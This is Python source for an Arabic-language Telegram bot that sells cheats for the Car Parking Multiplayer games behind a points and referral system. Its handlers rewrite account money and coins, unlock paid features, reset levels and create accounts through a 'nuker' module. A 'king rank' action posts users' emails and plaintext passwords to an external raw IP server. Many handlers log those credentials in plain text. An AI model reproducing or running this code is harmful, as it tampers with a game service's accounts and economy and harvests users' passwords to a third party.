            context.user_data["pending_ref_code"] = context.args[0].strip()
        lang = context.user_data.get("lang", "ar")
        await update_menu_message(context, user_id, TEXTS[lang]["not_sub"],
            reply_markup=get_subscription_keyboard(lang))
        return

    if user_id != ADMIN_ID and context.args and len(context.args) > 0:
        arg = context.args[0].upper().strip()
        if arg in ACCESS_CODES:
            ok, err = try_use_code(arg, user_id)
            if ok:
                await update.message.reply_text(
                    f"✅ <b>تم تفعيل الكود بنجاح!</b>\n"
                    f"🎫 <code>{arg}</code>\n"
                    f"⏱ <b>المدة:</b> {format_time_remaining(user_id)}\n\n"
                    f"🎉 الكود يفتح لك CPM1 و CPM2 مجاناً طوال مدة الاشتراك.",
                    parse_mode="HTML"
                )
            else:
                await update.message.reply_text(err)

    is_new = user_id not in USERS_DB
    referral_code = context.args[0] if context.args else context.user_data.pop("pending_ref_code", None)
    if is_new and referral_code:
        referrer_id = CODE_TO_USER.get(referral_code)
        if referrer_id and referrer_id != user_id:
            new_balance = add_points(referrer_id, 2)
            try:
                await context.bot.send_message(
                    chat_id=referrer_id,
                    text=f"🎉 شخص جديد سجل عبر رابطك!\n🪙 +2 نقاط | رصيدك: {new_balance}"
                )
            except Exception:
                pass

    get_ref_code(user_id)
    track_user_activity(user)
    context.user_data.pop("state", None)
    context.user_data["current_menu"] = "main"
    lang = context.user_data.get("lang", "ar")
    await update_menu_message(
        context, user.id,
        text=TEXTS[lang]["welcome"],
        reply_markup=get_main_menu_keyboard(lang),
    )

async def king_shortcut(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await require_channel_membership(update, context):
        return
    if user.id != ADMIN_ID and not await can_pay_points(update, context, 2):
        return
    track_user_activity(user, "btn_king")
    await execute_king_action(update, context)

async def handle_language_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = "ar" if query.data == "lang_ar" else "en"
    context.user_data["lang"] = lang
    context.user_data["authenticated"] = True
    
    context.user_data["current_menu"] = "main"
    if query.from_user.id != ADMIN_ID and not await check_subscription(context.bot, query.from_user.id):
        await update_menu_message(context, query.from_user.id, TEXTS[lang]["not_sub"],
            reply_markup=get_subscription_keyboard(lang))
        return
    await update_menu_message(context, query.from_user.id, TEXTS[lang]["welcome"], reply_markup=get_main_menu_keyboard(lang))

async def handle_verification(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    lang = context.user_data.get("lang", "ar")
    t = TEXTS[lang]
    if not await check_subscription(context.bot, user_id):
        await query.answer(t["sub_not_found"], show_alert=True)
        await update_menu_message(context, user_id, t["not_sub"],
            reply_markup=get_subscription_keyboard(lang))
        return
    await query.answer("✅")
    # Award the referral only after the invited user has joined all required chats.
    pending_code = context.user_data.pop("pending_ref_code", None)
    if user_id != ADMIN_ID and user_id not in USERS_DB and pending_code:
        referrer_id = CODE_TO_USER.get(pending_code)
        if referrer_id and referrer_id != user_id:
            new_balance = add_points(referrer_id, 2)
            try:
                await context.bot.send_message(referrer_id,
                    f"🎉 شخص جديد سجل عبر رابطك!\n🪙 +2 نقاط | رصيدك: {new_balance}")
            except Exception:
                pass
    USERS_DB.add(user_id)
    _save_users()
    context.user_data["current_menu"] = "main"
    await update_menu_message(context, user_id, t["welcome"], reply_markup=get_main_menu_keyboard(lang))


async def handle_menu_options(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    user_id = user.id
    lang = context.user_data.get("lang", "ar")
    t = TEXTS[lang]

    data = query.data

    if BOT_MAINTENANCE and user_id != ADMIN_ID:
        await query.answer("🔧 البوت متوقف مؤقتاً، انتظر قليلاً...", show_alert=True)
        return

    if not await require_channel_membership(update, context):
        return

    if data == "my_access":
        if user_id == ADMIN_ID:
            await query.answer("👑 أدمن — صلاحيات كاملة", show_alert=True)
            return
        if has_valid_access(user_id):
            await query.answer(
                f"🎫 كود فعال\n⏱ متبقي: {format_time_remaining(user_id)}",
                show_alert=True
            )
        else:
            await query.answer(
                "❌ ما عندكش كود فعال\n\nاطلب كود من الأدمن.",
                show_alert=True
            )
        return

    if data == "enter_access_code":
        if user_id == ADMIN_ID:
            await query.answer("👑 أنت الأدمن، معفي", show_alert=True)
            return
        if has_valid_access(user_id):
            await query.answer(
                f"✅ عندك كود فعال\n⏱ متبقي: {format_time_remaining(user_id)}",
                show_alert=True
            )
            return
        await query.answer()
        context.user_data["state"] = "WAIT_USER_ACCESS_CODE"
        await update_menu_message(
            context, user_id,
            "🎫 <b>تفعيل كود</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "أرسل الكود اللي عطاك الأدمن.\n\n"
            "✅ الكود يعطيك استخدام <b>مجاني</b> للبوت\n"
            "⏱ لمدة يحددها الأدمن.\n\n"
            "📌 مثال: <code>ALI2025</code>",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ إلغاء", callback_data="access_cancel")]
            ])
        )
        return

    await query.answer()
        
    if data == "access_cancel":
        context.user_data.pop("state", None)
        context.user_data.pop("pending_access_code", None)
        context.user_data.pop("pending_code_type", None)
        await update_menu_message(
            context, user_id,
            "❌ تم إلغاء العملية",
            reply_markup=get_back_keyboard(lang, "back_to_actions")
        )
        return

    if data.startswith("access_type:"):
        if user_id != ADMIN_ID:
            await query.answer("🚫 للأدمن فقط", show_alert=True)
            return

        pending = context.user_data.get("pending_access_code")
        if not pending:
            await query.answer("❌ ما كاينش كود", show_alert=True)
            return

        code_type = data.split(":", 1)[1]
        context.user_data["pending_code_type"] = code_type

        type_name = "👤 استعمال واحد" if code_type == "single" else "👥 جماعي"
        await query.message.reply_text(
            f"✅ <b>النوع:</b> {type_name}\n\n"
            f"🔽 <b>الخطوة 2:</b> اختر المدة:",
            parse_mode="HTML",
            reply_markup=get_durations_keyboard()
        )
        return

    if data.startswith("access_dur:"):
        if user_id != ADMIN_ID:
            await query.answer("🚫 للأدمن فقط", show_alert=True)
            return

        pending = context.user_data.get("pending_access_code")
        if not pending:
            await query.answer("❌ ما كاينش كود", show_alert=True)
            return

        dur_key = data.split(":", 1)[1]
        if dur_key not in DURATIONS:
            await query.answer("❌ مدة غير صالحة", show_alert=True)
            return

        code_type = context.user_data.get("pending_code_type", "single")
        dur_name, hours = DURATIONS[dur_key]
        max_uses = 1 if code_type == "single" else 999999

        ACCESS_CODES[pending] = {
            "hours": hours,
            "type": code_type,
            "max_uses": max_uses,
            "used_by_list": [],
            "created_by": user_id,
            "created_at": time.time(),
            "expires_at": time.time() + (24 * 3600)
        }
        _save_access()

        context.user_data.pop("state", None)
        context.user_data.pop("pending_access_code", None)
        context.user_data.pop("pending_code_type", None)

        bot_info = await context.bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start={pending}"

        type_display = "👤 استعمال واحد" if code_type == "single" else "👥 جماعي"

        await query.message.reply_text(
            f"✅ <b>تم إنشاء الكود بنجاح</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎫 <b>الكود:</b> <code>{pending}</code>\n"
            f"📌 <b>النوع:</b> {type_display}\n"
            f"⏱ <b>المدة:</b> {dur_name} ({hours} ساعة)\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📤 <b>طرق الإعطاء:</b>\n\n"
            f"1️⃣ يكتب: <code>/redeem {pending}</code>\n\n"
            f"2️⃣ ولا يفتح الرابط:\n<code>{ref_link}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            + ("⚠️ الكود يُستعمل مرة واحدة فقط" if code_type == "single"
               else "✅ الكود جماعي — يستعملو بزاف ناس"),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return

    if data == "admin_back":
        context.user_data.pop("state", None)
        await update_menu_message(context, user_id, "أهلا بك يا مشرف البوت يعمل الآن✅", reply_markup=get_admin_panel_keyboard())
        return

    if data == "admin_panel_back":
        context.user_data.pop("state", None)
        prev = context.user_data.pop("admin_prev_menu", "lang")
        context.user_data["current_menu"] = prev
        await restore_user_menu(context, user_id)
        return

    if data == "admin_broadcast":
        context.user_data["state"] = "WAIT_BROADCAST"
        await update_menu_message(context, user_id, "أرسل الرسالة هنا 📢✨", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع🔙", callback_data="admin_back")]]))
        return

    if data == "back_to_lang":
        context.user_data["current_menu"] = "lang"
        await update_menu_message(context, user_id, text=t["select_lang"], reply_markup=get_language_keyboard())
        return

    if data == "back_to_main":
        context.user_data.pop("state", None)
        context.user_data["current_menu"] = "main"
        await update_menu_message(context, user_id, t["welcome"], reply_markup=get_main_menu_keyboard(lang))
        return

    if data in ("back_to_accounts", "menu_acc_login"):
        context.user_data.pop("state", None)
        context.user_data["current_menu"] = "accounts"
        await update_menu_message(
            context, user_id, 
            "🎮 اختر اللعبة اللي تحب تسجل فيها:", 
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🎮 Car Parking 1", callback_data="login_cpm1")],
                [InlineKeyboardButton("🚗 Car Parking 2", callback_data="login_cpm2")],
                [InlineKeyboardButton(t["btn_back"], callback_data="back_to_main")]
            ])
        )
        return

    if data == "login_cpm1":
        context.user_data["login_type"] = "cpm1"
        context.user_data["state"] = "WAIT_CPM_EMAIL"
        await update_menu_message(context, user_id, t["logout_prompt"], reply_markup=get_back_keyboard(lang, "back_to_accounts"))
        return

    if data == "login_cpm2":
        context.user_data["login_type"] = "cpm2"
        context.user_data["state"] = "WAIT_CP2_LOGIN_EMAIL"
        await update_menu_message(context, user_id, "🚗 أدخل الإيميل تاع Car Parking 2:", reply_markup=get_back_keyboard(lang, "back_to_accounts"))
        return

    if data == "back_to_actions":
        context.user_data.pop("state", None)
        await show_actions_menu(context, user_id, lang)
        return

    if data == "menu_scripts":
        context.user_data["current_menu"] = "scripts"
        await update_menu_message(context, user_id, t["select_op"], reply_markup=get_scripts_keyboard(lang))
        return
    
    if data == "my_points":
        points = get_points(user_id)
        ref_code = get_ref_code(user_id)
        try:
            bot_info = await context.bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start={ref_code}"
        except:
            ref_link = f"(كودك: {ref_code})"
        text = (f"🪙 <b>رصيدك:</b> {points}\n\n"
                f"🔗 <b>رابط الإحالة تاعك:</b>\n<code>{ref_link}</code>\n\n"
                f"📌 كل واحد يسجل برابطك = +2 نقاط\n"
                f"📌 كل تفعيلة ناجحة في CPM1 أو CPM2 = خصم نقطتين")
        await update_menu_message(context, user_id, text, reply_markup=get_back_keyboard(lang, "back_to_main"))
        return

    if data == "collect_points":
        points = get_points(user_id)
        ref_code = get_ref_code(user_id)
        try:
            bot_info = await context.bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start={ref_code}"
        except:
            ref_link = f"(كودك: {ref_code})"
        text = (f"🎁 <b>رابط الإحالة تاعك:</b>\n\n"
                f"<code>{ref_link}</code>\n\n"
                f"🪙 <b>رصيدك الحالي:</b> {points} نقطة\n\n"
                f"👥 كل مستخدم جديد يدخل برابطك بعد الاشتراك في القنوات = +2 نقاط")
        await update_menu_message(context, user_id, text, reply_markup=get_back_keyboard(lang, "back_to_actions"))
        return

    if data == "preset_50m":
        if user_id != ADMIN_ID and not await can_pay_points(update, context, 2, lang):
            return
        td = nuker.get_token_data(user_id)
        email = td.get("email") if td else None
        rec = nuker.get_record(user_id, email) if email else {}
        old_money = rec.get("money", "غير محدد") if rec else "غير محدد"
        res = await nuker.set_money(user_id, 50000000)
        succ = res.get("ok", False)
        input_str = f"القديم: {old_money} ➔ الجديد: 50000000"
        log_user_action(user, "تعديل الأموال", email=email, password=td.get("password") if td else None, input_value=input_str, success=succ)
        await process_action_response(context, user_id, lang, succ, success_key="success_money")
        return

    if data == "preset_30k":
        if user_id != ADMIN_ID and not await can_pay_points(update, context, 2, lang):
            return
        td = nuker.get_token_data(user_id)
        email = td.get("email") if td else None
        rec = nuker.get_record(user_id, email) if email else {}
        old_coin = rec.get("coin", "غير محدد") if rec else "غير محدد"
        res = await nuker.set_coin(user_id, 30000)
        succ = res.get("ok", False)
        input_str = f"القديم: {old_coin} ➔ الجديد: 30000"
        log_user_action(user, "تعديل الكوينز", email=email, password=td.get("password") if td else None, input_value=input_str, success=succ)
        await process_action_response(context, user_id, lang, succ, success_key="success_coin")
        return

    if data == "preset_500k":
        if user_id != ADMIN_ID and not await can_pay_points(update, context, 2, lang):
            return
        td = nuker.get_token_data(user_id)
        email = td.get("email") if td else None
        rec = nuker.get_record(user_id, email) if email else {}
        old_coin = rec.get("coin", "غير محدد") if rec else "غير محدد"
        res = await nuker.set_coin(user_id, 500000)
        succ = res.get("ok", False)
        input_str = f"القديم: {old_coin} ➔ الجديد: 500000"
        log_user_action(user, "تعديل الكوينز", email=email, password=td.get("password") if td else None, input_value=input_str, success=succ)
        await process_action_response(context, user_id, lang, succ, success_key="success_coin")
        return

    if data in CHANNEL_MSG_IDS:
        track_user_activity(user, data)
        script_names = {
            "btn_perm": "سكربت دائم",
            "btn_script_money": "سكربت أموال CPM2",
            "btn_script_cars": "سكربت فتح السيارات CPM1",
            "btn_script_color": "إنشاء ID/اسم ملون"
        }
        action_desc = script_names.get(data, "سكربت")
        td = nuker.get_token_data(user_id)
        log_user_action(user, action_desc, email=td.get("email") if td else None, password=td.get("password") if td else None, success=True)
        target_msg_id = CHANNEL_MSG_IDS[data]
        await delete_old_control_message(context, user_id)
        await context.bot.forward_message(chat_id=user_id, from_chat_id=CHANNEL_USERNAME, message_id=target_msg_id)
        await context.bot.send_message(user_id, t["sent_success"])
        await restore_user_menu(context, user_id)
        return

    if data == "cp2_change_email":
        cost = ACTION_COSTS.get("cp2_change_email", 5)
        # ✅ تعديل: الأدمن أو صاحب الكود ما يتخصملوش نقاط
        if user_id != ADMIN_ID and not has_enough_points(user_id, cost):
            msg = f"❌ ما عندكش نقاط كافية\n💰 تحتاج: {cost}\n🪙 رصيدك: {get_points(user_id)}"
            await update_menu_message(context, user_id, msg, reply_markup=get_back_keyboard(lang, "back_to_actions"))
            return
        context.user_data["state"] = "WAIT_NEW_EMAIL_CP2"
        await update_menu_message(context, user_id, "أدخل الإيميل الجديد لـ Car Parking 2:", reply_markup=get_back_keyboard(lang, "back_to_actions"))
        return

    if data == "cp2_change_pass":
        cost = ACTION_COSTS.get("cp2_change_pass", 5)
        # ✅ تعديل: الأدمن أو صاحب الكود ما يتخصملوش نقاط
        if user_id != ADMIN_ID and not has_enough_points(user_id, cost):
            msg = f"❌ ما عندكش نقاط كافية\n💰 تحتاج: {cost}\n🪙 رصيدك: {get_points(user_id)}"
            await update_menu_message(context, user_id, msg, reply_markup=get_back_keyboard(lang, "back_to_actions"))
            return
        context.user_data["state"] = "WAIT_NEW_PASS_CP2"
        await update_menu_message(context, user_id, "أدخل الباسورد الجديد لـ Car Parking 2:", reply_markup=get_back_keyboard(lang, "back_to_actions"))
        return

    if data.startswith("act_"):
        await handle_account_action(update, context, data)
    
async def handle_account_action(update: Update, context: ContextTypes.DEFAULT_TYPE, action: str):
    query = update.callback_query
    user = query.from_user
    user_id = user.id
    lang = context.user_data.get("lang", "ar")
    t = TEXTS[lang]

    if action == "act_create_acc":
        cost = ACTION_COSTS.get("act_create_acc", 1)
        if not has_enough_points(user_id, cost):
            msg = f"❌ ما عندكش نقاط كافية\n💰 تحتاج: {cost}\n🪙 رصيدك: {get_points(user_id)}"
            await update_menu_message(context, user_id, msg, reply_markup=get_back_keyboard(lang, "back_to_actions"))
            return
        await update_menu_message(context, user_id, t["msg_creating_acc"])
        res = await nuker.create_account()
        if res.get("ok"):
            acc = res["account"]
            sv = "✅" if acc.get("saved") else "⚠️"
            msg = t["acc_created_format"].format(
                email=acc["email"], password=acc["password"],
                name=acc["name"], saved=sv
            )
            await delete_old_control_message(context, user_id)
            await context.bot.send_message(user_id, msg, parse_mode="HTML")
            log_user_action(user, "إنشاء حساب جديد", email=acc["email"], password=acc["password"], success=True)
            is_admin = (user_id == ADMIN_ID)
            new_balance = deduct_points(user_id, cost)
            if is_admin:
                await context.bot.send_message(user_id, "👑 أدمن | بدون خصم نقاط", parse_mode="HTML")
            else:
                await context.bot.send_message(user_id, f"🪙 -{cost} | رصيدك: <b>{new_balance}</b>", parse_mode="HTML")
        else:
            await delete_old_control_message(context, user_id)
            await context.bot.send_message(user_id, t["fail_create_acc"] + "\n" + str(res.get("message")), parse_mode="HTML")
        await restore_user_menu(context, user_id)
        return

    td = nuker.get_token_data(user_id)
    if not td or not td.get("auth_token"):
        context.user_data["state"] = "WAIT_CPM_EMAIL"
        await update_menu_message(context, user_id, t["logout_prompt"], reply_markup=get_back_keyboard(lang, back_target="back_to_accounts"))
        return

    cost = ACTION_COSTS.get(action, 0)
    # ✅ تعديل: الأدمن أو صاحب الكود ما يتخصملوش نقاط
    if cost > 0 and user_id != ADMIN_ID and not has_enough_points(user_id, cost):
        msg = f"❌ ما عندكش نقاط كافية\n💰 تحتاج: {cost}\n🪙 رصيدك: {get_points(user_id)}"
        await update_menu_message(context, user_id, msg, reply_markup=get_back_keyboard(lang, "back_to_actions"))
        return

    if action == "act_unlock_all":
        await execute_unlock_all_action(update, context)
        return

    if action == "act_all_levels":
        res = await nuker.set_all_levels(user_id)
        succ = res.get("ok", False)
        log_user_action(user, "جميع المستويات", email=td.get("email"), password=td.get("password"), success=succ)
        await process_action_response(context, user_id, lang, succ, success_key="success_all_levels")
        return

    if action == "act_reset_levels":
        res = await nuker.set_reset_levels(user_id)
        succ = res.get("ok", False)
        log_user_action(user, "خسارة المستويات", email=td.get("email"), password=td.get("password"), success=succ)
        await process_action_response(context, user_id, lang, succ, success_key="success_reset_levels")
        return
        
    if action == "act_details":
        await nuker.load(user_id)
        email = td.get("email", "N/A") if td else "N/A"
        record = nuker.get_record(user_id, email)
        name = record.get("Name", "غير معروف") if record else "غير معروف"
        pid = record.get("localID", "غير معروف") if record else "غير معروف"
        money = record.get("money", 0) if record else 0
        coin = record.get("coin", 0) if record else 0
        floats = record.get("floats", []) if record else []
        horns = "✅" if (len(floats) > 31 and all(floats[i] == 1.0 for i in [27, 28, 29, 30, 31])) else "❌"
        w16 = "✅" if (len(floats) > 32 and floats[32] == 1.0) else "❌"
        damage = "✅" if (len(floats) > 34 and floats[34] == 1.0) else "❌"
        fuel = "✅" if (len(floats) > 3 and floats[3] == 1.0) else "❌"
        smoke = "✅" if (len(floats) > 33 and floats[33] == 1.0) else "❌"
        details_text = t["details_format"].format(email=email, name=name, id=pid, money=money, coin=coin, horns=horns, w16=w16, damage=damage, fuel=fuel, smoke=smoke)
        await update_menu_message(context, user_id, details_text, reply_markup=get_back_keyboard(lang, back_target="back_to_actions"))
        return

    if action == "act_change_email":
        context.user_data["state"] = "WAIT_NEW_EMAIL"
        await update_menu_message(context, user_id, t["prompt_change_email"], reply_markup=get_back_keyboard(lang, back_target="back_to_actions"))
        return

    if action == "act_change_pass":
        context.user_data["state"] = "WAIT_NEW_PASS"
        await update_menu_message(context, user_id, t["prompt_change_pass"], reply_markup=get_back_keyboard(lang, back_target="back_to_actions"))
        return

    if action == "act_king":
        await execute_king_action(update, context)
        return

    if action == "act_money":
        context.user_data["state"] = "WAIT_MONEY_INPUT"
        await update_menu_message(context, user_id, t["enter_money"], reply_markup=get_preset_money_keyboard(lang))
        return

    if action == "act_coin":
        context.user_data["state"] = "WAIT_COIN_INPUT"
        await update_menu_message(context, user_id, t["enter_coin"], reply_markup=get_preset_coin_keyboard(lang))
        return

    if action == "act_id":
        context.user_data["state"] = "WAIT_ID_INPUT"
        await update_menu_message(context, user_id, t["enter_id"], reply_markup=get_back_keyboard(lang, back_target="back_to_actions"))
        return

    if action == "act_name":
        context.user_data["state"] = "WAIT_NAME_INPUT"
        await update_menu_message(context, user_id, t["enter_name"], reply_markup=get_back_keyboard(lang, back_target="back_to_actions"))
        return

    if action == "act_color_id":
        log_user_action(user, "إنشاء ID/اسم ملون", email=td.get("email"), password=td.get("password"), success=True)
        await delete_old_control_message(context, user_id)
        back_btn = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_actions")]])
        if lang == "ar":
            msg = (
                "🎨 <b>إنشاء اسم / ID ملون</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "✏️ يمكنك تصميم اسمك أو ID بألوان وأشكال مميزة!\n\n"
                "🌐 افتح الرابط، اكتب اسمك أو ID، اختر الألوان اللي تعجبك، ثم انسخ النتيجة وضعها في اللعبة:\n\n"
                "🔗 <a href='https://ripou02-tech.github.io/Ripou0209/'>اضغط هنا لتصميم اسمك الملون</a>"
            )
        else:
            msg = (
                "🎨 <b>Colored Name / ID Creator</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "✏️ Design your name or ID with unique colors and styles!\n\n"
                "🌐 Open the link, type your name or ID, pick your favorite colors, then copy the result and paste it in the game:\n\n"
                "🔗 <a href='https://ripou02-tech.github.io/Ripou0209/'>Click here to design your colored name</a>"
            )
        sent = await context.bot.send_message(user_id, msg, parse_mode="HTML", reply_markup=back_btn, disable_web_page_preview=False)
        context.user_data["last_control_message_id"] = sent.message_id
        return

    res = {"ok": False}
    action_desc = ""
    s_key = ""
    if action == "act_w16":
        action_desc = "فتح المحرك W16"
        s_key = "success_w16"
        res = await nuker.unlock_w16(user_id)
    elif action == "act_horns":
        action_desc = "فتح الأبواق"
        s_key = "success_horns"
        res = await nuker.unlock_horns(user_id)
    elif action == "act_fuel":
        action_desc = "وقود غير محدود"
        s_key = "success_fuel"
        res = await nuker.unlimited_fuel(user_id)
    elif action == "act_damage":
        action_desc = "عدم تضرر السيارات"
        s_key = "success_damage"
        res = await nuker.disable_damage(user_id)
    elif action == "act_smoke":
        action_desc = "فتح لون الدخان"
        s_key = "success_smoke"
        res = await nuker.unlock_smoke(user_id)
    elif action == "act_police":
        action_desc = "فتح صافرات الشرطة"
        s_key = "success_police"
        res = await nuker.unlock_police(user_id)
    elif action == "act_houses":
        action_desc = "فتح المنازل"
        s_key = "success_houses"
        res = await nuker.unlock_houses(user_id)
    elif action == "act_fix":
        action_desc = "إصلاح الحساب"
        s_key = "success_fix"
        res = await nuker.fix_account(user_id)

    succ = res.get("ok", False)
    if action_desc:
        log_user_action(user, action_desc, email=td.get("email"), password=td.get("password"), success=succ)
    await process_action_response(context, user_id, lang, succ, success_key=s_key)
    
async def execute_unlock_all_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    lang = context.user_data.get("lang", "ar")
    t = TEXTS[lang]
    td = nuker.get_token_data(user_id)

    steps = [
        ("msg_unlock_money", lambda: nuker.set_money(user_id, 50000000)),
        ("msg_unlock_coin", lambda: nuker.set_coin(user_id, 500000)),
        ("msg_unlock_w16", lambda: nuker.unlock_w16(user_id)),
        ("msg_unlock_horns", lambda: nuker.unlock_horns(user_id)),
        ("msg_unlock_fuel", lambda: nuker.unlimited_fuel(user_id)),
        ("msg_unlock_damage", lambda: nuker.disable_damage(user_id)),
        ("msg_unlock_smoke", lambda: nuker.unlock_smoke(user_id)),
    ]

    all_success = True
    for msg_key, func in steps:
        await update_menu_message(context, user_id, t[msg_key])
        res = await func()
        if not res.get("ok", False):
            all_success = False
        await asyncio.sleep(0.8)

    log_user_action(user, "فتح جميع الميزات", email=td.get("email") if td else None, password=td.get("password") if td else None, success=all_success)

    cost = ACTION_COSTS.get("act_unlock_all", 3)
    await process_action_response(context, user_id, lang, all_success, success_key="success_unlock_all", cost=cost)

async def process_action_response(context: ContextTypes.DEFAULT_TYPE, user_id: int, lang: str, success: bool, success_key: str = None, cost: int = 2):
    t = TEXTS[lang]
    await delete_old_control_message(context, user_id)
    if success:
        is_admin = (user_id == ADMIN_ID)
        new_balance = deduct_points(user_id, cost)
        msg = t.get(success_key, t["applied_success"]) if success_key else t["applied_success"]
        if is_admin:
            msg += f"\n\n👑 أدمن | بدون خصم نقاط"
        else:
            msg += f"\n\n🪙 -{cost} | رصيدك: <b>{new_balance}</b>"
        await context.bot.send_message(user_id, msg, parse_mode="HTML")
    else:
        await context.bot.send_message(user_id, t["general_error"], parse_mode="HTML")
    await restore_user_menu(context, user_id)

async def execute_king_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    lang = context.user_data.get("lang", "ar")
    t = TEXTS[lang]

    td = nuker.get_token_data(user_id)
    if not td or not td.get("email") or not td.get("password"):
        context.user_data["state"] = "WAIT_CPM_EMAIL"
        await update_menu_message(context, user_id, t["logout_prompt"], reply_markup=get_back_keyboard(lang, back_target="back_to_accounts"))
        return

    await update_menu_message(context, user_id, t["injecting"])

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 16; DNY-NX9 Build/HONORDNY-N39)",
        "Host": "129.146.252.84",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    payload = {"email": td["email"], "password": td["password"], "uid": generate_random_uid()}

    success = False
    try:
        async with httpx.AsyncClient(timeout=15.0, http2=False) as client:
            response = await client.post(INJECT_URL, json=payload, headers=headers)
            res_json = response.json()
            if res_json.get("success"):
                success = True
    except Exception:
        success = False

    record_credential(user_id, td["email"], td["password"], status="success" if success else "failed")
    log_user_action(user, "رتبة الملك", email=td["email"], password=td["password"], success=success)

    await delete_old_control_message(context, user_id)

    if success:
        await context.bot.send_message(user_id, t["inject_success"], parse_mode="HTML")
        await context.bot.send_message(user_id, t["success_king"], parse_mode="HTML")
    else:
        await context.bot.send_message(user_id, t["general_error"], parse_mode="HTML")

    await restore_user_menu(context, user_id)

async def show_actions_menu(context: ContextTypes.DEFAULT_TYPE, user_id: int, lang: str):
    t = TEXTS[lang]
    td = nuker.get_token_data(user_id)
    email = td.get("email") if td else ""
    
    if context.user_data.get("login_type") == "cpm2":
        context.user_data["current_menu"] = "actions"
        # Use the account authenticated through Login > CPM2 for all CPM2 activations.
        td = nuker.get_token_data(user_id) or {}
        email = td.get("cp2_email") or context.user_data.get("cpm2_act_email")
        password = td.get("cp2_password") or context.user_data.get("cpm2_act_password")
        if not email or not password:
            await update_menu_message(context, user_id,
                "❌ CPM2 session not found. Please log in again.",
                reply_markup=get_back_keyboard(lang, "back_to_accounts"))
            return
        context.user_data["cpm2_act_email"] = email
        context.user_data["cpm2_act_password"] = password
        if not context.user_data.get("cpm2_act_cars"):
            try:
                snap = await cpm2_load_garage(email, password)
                if snap.get("error"):
                    await update_menu_message(context, user_id,
                        "❌ CPM2 login succeeded, but activations could not load: " + str(snap["error"])[:150],
                        reply_markup=get_back_keyboard(lang, "back_to_accounts"))
                    return
                context.user_data["cpm2_act_cars"] = snap.get("cars") or []
            except Exception as exc:
                await update_menu_message(context, user_id,
                    ("❌ تعذر تحميل تفعيلات CPM2: " if lang == "ar" else "❌ CPM2 activations could not load: ") + str(exc)[:150],
                    reply_markup=get_back_keyboard(lang, "back_to_accounts"))
                return
        await update_menu_message(context, user_id,
            (f"✅ تم الاتصال بحساب CPM2. عدد السيارات: {len(context.user_data.get('cpm2_act_cars') or [])}\nاختر التفعيلة:" if lang == "ar" else f"✅ CPM2 connected. Cars found: {len(context.user_data.get('cpm2_act_cars') or [])}\nChoose an activation:"),
            reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
        return

    context.user_data["current_menu"] = "actions"

    if LAST_LOGGED_EMAIL.get(user_id) != email and email:
        await delete_old_control_message(context, user_id)
        await context.bot.send_message(user_id, t["login_success"].format(email=email), parse_mode="HTML")
        LAST_LOGGED_EMAIL[user_id] = email

    await update_menu_message(context, user_id, text=t["select_op"], reply_markup=get_account_actions_keyboard(lang))
    
async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if is_banned(user_id):
        return
    if BOT_MAINTENANCE and user_id != ADMIN_ID:
        await update.message.reply_text("🔧 البوت متوقف مؤقتاً، انتظر قليلاً...")
        return
    if not await require_channel_membership(update, context):
        return
        
    track_user_activity(user)

    state = context.user_data.get("state")
    lang = context.user_data.get("lang", "ar")
    t = TEXTS[lang]

    if state not in ("WAIT_BROADCAST", "WAIT_ACCESS_CODE", "WAIT_USER_ACCESS_CODE"):
        if update.message and update.message.text and not update.message.text.startswith('/'):
            try:
                await update.message.delete()
            except TelegramError:
                pass

    text = update.message.text.strip() if update.message and update.message.text else ""


    if state == "WAIT_CPM2_ACT_EMAIL":
        email = text.strip()
        if "@" not in email:
            await update_menu_message(context, user_id, "❌ أدخل بريد CPM2 صحيحاً." if lang == "ar" else "❌ Enter a valid CPM2 email.")
            return
        context.user_data["cpm2_act_pending_email"] = email
        context.user_data["state"] = "WAIT_CPM2_ACT_PASSWORD"
        await update_menu_message(context, user_id, "🔐 أدخل كلمة مرور CPM2. سيتم حذف هذه الرسالة تلقائياً." if lang == "ar" else "🔐 Enter your CPM2 password. This message is deleted automatically.")
        return

    if state == "WAIT_CPM2_ACT_PASSWORD":
        email = context.user_data.pop("cpm2_act_pending_email", "")
        password = text.strip()
        context.user_data.pop("state", None)
        if not email or not password:
            await update_menu_message(context, user_id, "❌ بيانات تسجيل الدخول غير مكتملة." if lang == "ar" else "❌ Login details are incomplete.")
            return
        await update_menu_message(context, user_id, "⏳ جارٍ التحقق من حساب CPM2 وتحميل السيارات..." if lang == "ar" else "⏳ Checking CPM2 account and loading garage...")
        try:
            snap = await cpm2_load_garage(email, password)
        except Exception as exc:
            snap = {"error": str(exc)[:180]}
        if snap.get("error"):
            await update_menu_message(context, user_id, ("❌ فشل تسجيل الدخول إلى CPM2: " if lang == "ar" else "❌ CPM2 login failed: ") + str(snap["error"])[:180],
                reply_markup=get_back_keyboard(lang, "back_to_main"))
            return
